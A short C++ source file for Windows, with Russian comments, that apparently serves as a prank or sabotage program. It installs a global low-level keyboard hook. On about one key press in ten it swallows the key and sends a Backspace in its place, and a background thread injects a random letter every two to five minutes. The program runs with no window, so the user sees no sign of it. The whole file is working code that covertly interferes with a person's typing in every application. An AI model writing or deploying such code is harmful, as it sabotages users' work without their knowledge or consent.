#include <windows.h>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyStruct = (KBDLLHOOKSTRUCT*)lParam;

        if ((std::rand() % 10) == 0) { // 10% шанс
            INPUT input = { 0 };
            input.type = INPUT_KEYBOARD;
            input.ki.wVk = VK_BACK; // Клавиша Backspace
            SendInput(1, &input, sizeof(INPUT));
            return 1; // Блокируем исходное нажатие
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void RandomKeyPresser() {
    while (true) {
        int sleepTime = (std::rand() % 181 + 120) * 1000;
        std::this_thread::sleep_for(std::chrono::milliseconds(sleepTime));

        INPUT input = { 0 };
        input.type = INPUT_KEYBOARD;
        int key;
        if (std::rand() % 2 == 0) {
            key = (std::rand() % 26) + 65; // Генерация случайной заглавной буквы (A-Z)
        }
        else {
            key = (std::rand() % 26) + 97; // Генерация случайной строчной буквы (a-z)
        }
        input.ki.wVk = key;
        SendInput(1, &input, sizeof(INPUT));
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    std::srand(static_cast<unsigned int>(std::time(nullptr)));

    std::thread randomKeyThread(RandomKeyPresser);

    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (!hHook) {
        MessageBox(NULL, L"Не удалось установить хук", L"Ошибка", MB_ICONERROR);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hHook);
    return 0;
}
